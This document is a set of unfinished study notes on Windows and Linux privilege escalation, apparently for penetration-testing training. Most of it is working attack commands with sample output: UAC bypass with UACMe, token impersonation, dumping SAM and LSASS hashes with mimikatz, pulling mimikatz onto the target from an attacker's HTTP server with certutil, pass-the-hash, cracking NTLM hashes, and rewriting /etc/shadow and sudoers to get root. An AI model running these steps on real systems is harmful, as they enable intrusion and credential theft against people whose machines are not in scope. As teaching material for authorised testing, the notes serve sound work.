# Not Completed I will Complete this ASAP
# **1-Windows Privilege Escalation:**
## **1-Enumeration**
### **1-Enumerating System Information**
After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.

What are we looking for? 
- Hostname 
- OS Name (Windows 7, 8 etc) 
- OS Build & Service Pack (Windows 7 SP1 7600) 
- OS Architecture (x64/x86) 
- Installed updates/Hotfixes
```powershell
systeminfo
```
Enumerating the Hotfixes
```powershell
wmic  qfe get Caption,Description,HotFixID
```

```powershell
Get-HotFix
```
Enumerating More info about the system
```powershell
type C:\Windows\System32eula.txt
```
### **2-Enumerating Users & Groups**
After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system. 

What are we looking for?
	- Current user & privileges
	- Additional user information
	- Other users on the system
	- Groups 
	- Members of the built-in administrator group
Current user 
```powershell
whoami
```
Current user  privileges
```powershell
whoami /priv
```
Additional user information
```powershell
query user
```
Other users on the system
```powershell
net users
```
Other Users data
```powershell
net user Administrator #or the username you want
```
Groups
```powershell
net localgroup
```
Members of the built-in administrator group
```powershell
net localgroup Administrators
```
### **3-Enumerating Network Information**
+ What are we looking for? 
	+ Current IP address & network adapter 
	+ Internal networks 
	+ Other hosts on the network 
	+ Routing table 
	+ TCP/UDP services running and their respective ports 
	+ Windows Firewall state
Current IP address & network adapter 
```powershell
ipconfig
#or
ipconfig /all
```
Routing table 
```
route print
```
Other hosts on the network 
```powershell
arp -a
```
TCP/UDP services running and their respective ports 
```powershell
netstat -ano
```
Windows Firewall state
```powershell
Windows Firewall state
#or
netsh advfirewall firewall show
#or
netsh advfirewall firewall show rule
#or
netsh advfirewall firewall dump
```
### **4-Enumerating Processes & Services**
After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.

- What are we looking for?
	- Running processes & services 
	- Scheduled tasks
➔ A process is an instance of a running executable (.exe) or program.
➔ A service is a process which runs in the background and does not interact with the desktop
Running processes & services 
```powershell
net start
Get-Service
ps
tasklist /SVC
```
Scheduled tasks
```powershell
 schtasks /query /fo LIST
 # For More Details
 schtasks /query /fo LIST /v
```
### **5-Automating Windows Local Enumeration**
- In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.

- While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.

- In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords etc.

- JAWS -Just Another Windows (Enum) Script - JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7
	- GitHub Repo: <a href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a>
running the tool
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws_Enum.txt

```
## **2-Privilege Escalation**
### **1-Windows Kernel Exploits**
- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers
- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
	- User Mode –Programs and services running in user mode have limited access to system resources and functionality.
	- Kernel Mode –Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
- Kernel exploits on Windows will typically target vulnerabilities In the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell
- This process will differ based on the version of Windows being targeted and the kernel exploit being used.
- Privilege escalation on Windows systems will typically follow the following methodology:
	- Identifying kernel vulnerabilities
	- Downloading, compiling and transferring kernel exploits onto the target system.
- Windows-Exploit-Suggester - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins
	- GitHub: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a>
exploit:

Windows Machine:
```powershell
systeminfo
```
take the systeminfo output and put in a file in your linux as a txt file
then:
```bash
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
python2 windows-exploit-suggester.py --update
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
pip2 --version
sudo pip2 install xlrd==1.2.0
sudo python2 windows-exploit-suggester.py --database {the xls file the generated from the tool when you make the --update option eg.(2025-06-11-mssb.xls)} --systeminfo sysinfo.txt
```
OR
```bash
git clone https://github.com/bitsadmin/wesng.git
cd wesng
./wes.py --update
./wes.py sysinfo.txt
```
both of them will give the CVE or ms vulns and use to make the exploit
### **2-Bypassing UAC With UACMe**
- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges
- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation
- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system
- UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques. 
	- GitHub: <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a>
- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target
- 
```powershell
systeminfo #toget the build number of the your windows target
#then 
Akagi64.exe {Method} Payload.exe
```
### **3-Access Token Impersonation**
- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
- A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will typically be assigned one of the following security levels: 
	- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
	- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens.
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
	- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
- Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
- We can use the incognito module to display a list of available tokens that we can impersonate

```bash
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege #
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege #
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token ATTACKDEFENSE\\Administrator 
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator                                                                                                        meterpreter > getuid

Server username: ATTACKDEFENSE\Administrator
```
### **4-Windows Password Hashes**
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA). 
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
	- LM 
	- NTLM
#### SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process
#### LM (LanMan)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
	- The password is broken into two seven-character chunks.
	- All characters are then converted into uppercase.
	- Each chunk is then hashed separately with the DES algorithm.
- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.
<img src="https://github.com/ahmmmeeedsherif/Privilege-Escalation/blob/main/Screenshot%202025-06-11%20114521.png"/>

#### NTLM (NTHash)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
	- Does not split the hash in to two chunks.
	- Case sensitive.
	- Allows the use of symbols and unicode characters.
![[Screenshot 2025-06-11 114716.png]]
### **5-Searching For Passwords In Windows Configuration Files**
- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
- This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.
- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.
- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
	- C:\Windows\Panther\Unattend.xml 
	- C:\Windows\Panther\Autounattend.xml
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
```powershell
cd C:\Windows\Panther
dir
type Unattend.xml 
#or
type Autounattend.xml
```
### **6-Dumping Hashes With Mimikatz & Pass-The-Hash Attacks****
#### Dumping Hashes With Mimikatz
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
- The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.
- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
Note: Mimikatz will require elevated privileges in order to run correctly.

#### Pass-The-Hash Attacks
- Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately
- We can use multiple tools to facilitate a Pass-The-Hash attack: 
	- Metasploit PsExec module
	- Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
```powershell
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ahmed:1000:aad3b435b51404eeaad3b435b51404ee:f0e181e88ca235d83e3633a50c274eec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mohamed:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
# if you dont have a meterpreter session but you have a elevated shell
# in your kali Linux
┌──(ahmed㉿kali)-[~/Tools/Akagi]
└─$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
┌──(ahmed㉿kali)-[~/Tools/Akagi]
└─$ cd /usr/share/windows-resources/mimikatz/x64/
┌──(ahmed㉿kali)-[/usr/share/windows-resources/mimikatz/x64/]
└─$ python3 -m http.server 8080
# on the windows shell
C:\temp> certutil -urlcache -f http::{Your IP}:8080/mimikatz.exe mimikatz.exe
C:\Windows\system32>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam

# this is all mimikatz modules
crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module
```

```bash
# Pass the hash attack
meterpreter > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set smbuser ahmed
msf6 exploit(windows/smb/psexec) > set smbpass f0e181e88ca235d83e3633a50c274eec
msf6 exploit(windows/smb/psexec) > set rhosts {Target_Ip}
msf6 exploit(windows/smb/psexec) > set target Native\ upload 
msf6 exploit(windows/smb/psexec) > run
# Or
┌──(ahmed㉿kali)-[~]
└─$ crackmapexec smb {Target_Ip} -u ahmed -H "f0e181e88ca235d83e3633a50c274eec" -X "ipconfig"
```
### **7-Identifying Windows Privilege Escalation Vulnerabilities**
- In order to elevate your privileges on Windows, you must first, identify privilege escalation vulnerabilities that exist on the target system.
- This process will differ greatly based on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system’s unique configuration.
- This process can be quite tedious and time consuming and as a result, it is recommended to automate the processes of identifying privilege escalation vulnerabilities. This can be done through the use of various automation scripts. PrivescCheck 
- PrivescCheck - This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation. 
- GitHub Repo: <a href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a>
### **8-Dumping & Cracking NTLM Hashes**
#### Windows Password Hashes
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
- Windows versions up to Windows Server 2003 utilize two different types of hashes: 
	- LM 
	- NTLM
- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
#### SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process.

```bash
meterpreter > migrate -N lsass.exe
#or 
meterpreter > pgrep lsass.exe
544
meterpreter > migrate 544
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ahmed:1000:aad3b435b51404eeaad3b435b51404ee:f0e181e88ca235d83e3633a50c274eec:::
meterpreter > background
msf6 exploit(windows/smb/ms17_010_eternalblue) > creds
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/analyze/crack_windows
msf6 exploit(windows/smb/ms17_010_eternalblue) > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
msf6 exploit(windows/smb/ms17_010_eternalblue) > crerds

# or after hashdump take the hashes and put it in a file for example called hashes .txt
┌──(ahmed㉿kali)-[~]
└─$ john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 
# using hashcat
┌──(ahmed㉿kali)-[~]
└─$ hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
### **9-Persistence Via Services**
### **10-Persistence Via RDP**
### **11-Privilege Escalation with PowerUp**
### **12-Windows Credential Manager**
### **13-PowerShell History**
### **14-Exploiting Insecure Service Permissions**
### **15-Juicy Potato**
# **2-Linux Privilege Escalation:**

## **1-Enumeration:**
### **1- Enumerating System Information**
after gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.

What are we looking for?
- Hostname
- Distribution & distribution release version
- Kernel Version & architecture
- CPU information
- Disk information & mounted drivers
- installed packages/software
Knowing the hostname
```bash
root👻docker-desktop:~# hostname
docker-desktop
```
Identifying the distribution running on the target machine
```bash
root👻docker-desktop:~# cat /etc/issue
Kali GNU/Linux Rolling \n \l
```
Identifying More Information about the OS
```bash
root👻docker-desktop:~# cat /etc/*release
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2025.1"
VERSION="2025.1"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31"
```
Enumerate the kernel version that is running on the victim machine
```bash
root👻docker-desktop:~# uname -a
Linux docker-desktop 6.10.14-linuxkit #1 SMP Tue Apr 15 16:00:54 UTC 2025 aarch64 GNU/Linux
#Limit it to the kernel version only
root👻docker-desktop:~# uname -r
6.10.14-linuxkit
```
Identifying the user env variables
```bash
root👻docker-desktop:~# env
HOSTNAME=docker-desktop
LESS_TERMCAP_se=
LESS_TERMCAP_so=
PWD=/root
HOME=/root
LANG=C.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:.7z=01;31:.ace=01;31:.alz=01;31:.apk=01;31:.arc=01;31:.arj=01;31:.bz=01;31:.bz2=01;31:.cab=01;31:.cpio=01;31:.crate=01;31:.deb=01;31:.drpm=01;31:.dwm=01;31:.dz=01;31:.ear=01;31:.egg=01;31:.esd=01;31:.gz=01;31:.jar=01;31:.lha=01;31:.lrz=01;31:.lz=01;31:.lz4=01;31:.lzh=01;31:.lzma=01;31:.lzo=01;31:.pyz=01;31:.rar=01;31:.rpm=01;31:.rz=01;31:.sar=01;31:.swm=01;31:.t7z=01;31:.tar=01;31:.taz=01;31:.tbz=01;31:.tbz2=01;31:.tgz=01;31:.tlz=01;31:.txz=01;31:.tz=01;31:.tzo=01;31:.tzst=01;31:.udeb=01;31:.war=01;31:.whl=01;31:.wim=01;31:.xz=01;31:.z=01;31:.zip=01;31:.zoo=01;31:.zst=01;31:.avif=01;35:.jpg=01;35:.jpeg=01;35:.jxl=01;35:.mjpg=01;35:.mjpeg=01;35:.gif=01;35:.bmp=01;35:.pbm=01;35:.pgm=01;35:.ppm=01;35:.tga=01;35:.xbm=01;35:.xpm=01;35:.tif=01;35:.tiff=01;35:.png=01;35:.svg=01;35:.svgz=01;35:.mng=01;35:.pcx=01;35:.mov=01;35:.mpg=01;35:.mpeg=01;35:.m2v=01;35:.mkv=01;35:.webm=01;35:.webp=01;35:.ogm=01;35:.mp4=01;35:.m4v=01;35:.mp4v=01;35:.vob=01;35:.qt=01;35:.nuv=01;35:.wmv=01;35:.asf=01;35:.rm=01;35:.rmvb=01;35:.flc=01;35:.avi=01;35:.fli=01;35:.flv=01;35:.gl=01;35:.dl=01;35:.xcf=01;35:.xwd=01;35:.yuv=01;35:.cgm=01;35:.emf=01;35:.ogv=01;35:.ogx=01;35:.aac=00;36:.au=00;36:.flac=00;36:.m4a=00;36:.mid=00;36:.midi=00;36:.mka=00;36:.mp3=00;36:.mpc=00;36:.ogg=00;36:.ra=00;36:.wav=00;36:.oga=00;36:.opus=00;36:.spx=00;36:.xspf=00;36:~=00;90:#=00;90:.bak=00;90:.crdownload=00;90:.dpkg-dist=00;90:.dpkg-new=00;90:.dpkg-old=00;90:.dpkg-tmp=00;90:.old=00;90:.orig=00;90:.part=00;90:.rej=00;90:.rpmnew=00;90:.rpmorig=00;90:.rpmsave=00;90:.swp=00;90:.tmp=00;90:.ucf-dist=00;90:.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:
TERM=xterm
LESS_TERMCAP_mb=
LESS_TERMCAP_me=
LESS_TERMCAP_md=
LESS_TERMCAP_ue=
SHLVL=2
LESS_TERMCAP_us=
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
LOGNAME=root
OLDPWD=/
```
Display the CPU Information
```bash
root👻docker-desktop:~# lscpu                  
Architecture:             aarch64
  CPU op-mode(s):         64-bit
  Byte Order:             Little Endian
CPU(s):                   8
  On-line CPU(s) list:    0-7
Vendor ID:                Apple
  Model name:             -
    Model:                0
    Thread(s) per core:   1
    Core(s) per cluster:  8
    Socket(s):            -
    Cluster(s):           1
    Stepping:             0x0
    BogoMIPS:             48.00
    Flags:                fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 asimddp sha512 asimdfhm dit uscat ilrcpc flagm sb paca pacg dcpodp flag m2 frint
Vulnerabilities:          
  Gather data sampling:   Not affected
  Itlb multihit:          Not affected
  L1tf:                   Not affected
  Mds:                    Not affected
  Meltdown:               Not affected
  Mmio stale data:        Not affected
  Reg file data sampling: Not affected
  Retbleed:               Not affected
  Spec rstack overflow:   Not affected
  Spec store bypass:      Vulnerable
  Spectre v1:             Mitigation; __user pointer sanitization
  Spectre v2:             Not affected
  Srbds:                  Not affected
  Tsx async abort:        Not affected
```
Identifying how much rams are been consumed
```bash
root👻docker-desktop:~# free -h                    
               total        used        free      shared  buff/cache   available
Mem:           3.8Gi       442Mi       3.1Gi       628Ki       460Mi       3.4Gi
Swap:          1.0Gi          0B       1.0Gi                   
root👻docker-desktop:~#
```
Identifying drives of the OS
```bash
root👻docker-desktop:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay        1007G   11G  945G   2% /
tmpfs            64M     0   64M   0% /dev
shm             2.0G     0  2.0G   0% /dev/shm
/dev/vda1      1007G   11G  945G   2% /etc/hosts

# Limit this to specifc file extention

root👻docker-desktop:~# df -ht ext4
Filesystem      Size  Used Avail Use% Mounted on
/dev/vda1      1007G   11G  945G   2% /etc/hosts
```
display disk info
```bash
root👻docker-desktop:~# lsblk | grep vd
vda    254:0    0     1T  0 disk 
└─vda1 254:1    0  1024G  0 part /etc/hosts
vdb    254:16   0 537.4M  1 disk
```
Enumerate all installed packages/software
```bash
root👻docker-desktop:~# dpkg -l # for debian
```
### **2- Enumerating Users & Groups** 
after gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system

What are we looking for?
- Current user & privileges
- Other Users on the system
- Groups

knowing the current user id
id = 0 means that the current user is root
gid means group id
```bash
root👻docker-desktop:~# id      
uid=0(root) gid=0(root) groups=0(root)
```
Enumerating the other users on the Linux system
```bash
root👻docker-desktop:~# cat /etc/passwd
```
Adding user to our Linux
```bash
root👻docker-desktop:~# useradd -m -s /bin/bash ahmed
# to add the user to a specific group we use
root👻docker-desktop:~# usermod -aG root ahmed
root👻docker-desktop:~# groups ahmed
ahmed : ahmed root
```
Enumerating groups in Linux
```bash
root👻docker-desktop:~# cat /etc/group
```
### **3- Enumerating Network Information**
What are we looking for?
- Current IP address & network adapter
- other hosts on the network
to know the current IP & network adapter of the target system
```bash
root👻docker-desktop:~# ip a
# OR
root👻docker-desktop:~# ifconfig
```
to know the internal domains you can access
```bash
root👻docker-desktop:~# cat /etc/hosts
```
### **4- Enumerating Processes & Cron Jobs**
after gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running

What are we looking for?
- Running services
- Cron jobs

Listing current running processes 
```bash
root👻docker-desktop:~# ps aux
# to get processes of a specific user
root👻docker-desktop:~# ps aux | grep root
# another command
root👻docker-desktop:~# top
```
Listing cron
```bash
root👻docker-desktop:~# crontab -l
no crontab for root
# another way to list all cron files
root👻docker-desktop:~# ls -lah /etc/cron*
root👻docker-desktop:~# cat /etc/cron*
```
## **2-Privilege Escalation**
### **1-Linux Kernel Exploits**
- Kernel exploits on Linux will typically target vulnerabilities In the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell
- This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used
- Privilege escalation on Linux systems will typically follow the following methodology:
	- Identifying kernel vulnerabilities
	- Downloading, compiling and transferring kernel exploits onto the target system.
Tools:
Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit
+ GitHub: <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a>
after gaining access to the target machine we use download the tool on the machine using the documentation

```bash
root👻docker-desktop:~# wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
root👻docker-desktop:~# chmod +x ./les.sh
root👻docker-desktop:~# ./les.sh
```

### **2-Linux Privilege Escalation - Weak Permissions**
- LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities. 
- GitHub Repo: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>
```bash
kali@kali:~$ find / -not -type f -perm -o+w
# if you find the /etc/shadow
kali@kali:~$ ls -al /etc/shadow
-rw-rw-rw 1 root shadow 523 jun 4 2025 /etc/shadow
kali@kali:~$ openssl passwd -1 -salt {anything} {any_password_you_want}
#eg
kali@kali:~$ openssl passwd -1 -salt abc password

kali@kali:~$ vim /etc/shadow
# make the line root:*:17764:0:99999:7::: replace the * whith the hash
# root$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
# now the root password is {password} and you can login to it using su root witht the password password
```
### **3-Exploiting SUID Binaries**
- In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
- When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
- SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with “root” permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.
- This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
	- Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
	- Access permissions – We will require executable permissions in order to execute the SUID binary.

```bash
kali👻docker-desktop:~# find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/vim.tiny
/usr/bin/sudo
/bin/su
/bin/mount
/bin/unmount
kali👻docker-desktop:~# ls-la /usr/bin/vim.tiny
-rwsr-xr-x 1 root root 1108024 June 4 /usr/bin/vim.tiny
kali👻docker-desktop:~# vim.tiny /etc/sudoers
# add under # See Sudoers(5) for more information on "#include" directives:
# add kali ALL=NOPASSWD:ALL
# the ESC then type :wq! to override
kali👻docker-desktop:~# sudo su
root👻docker-desktop:~#
```
### **4-Exploiting Misconfigured Cron Jobs**
- Linux implements task scheduling through a utility called Cron.
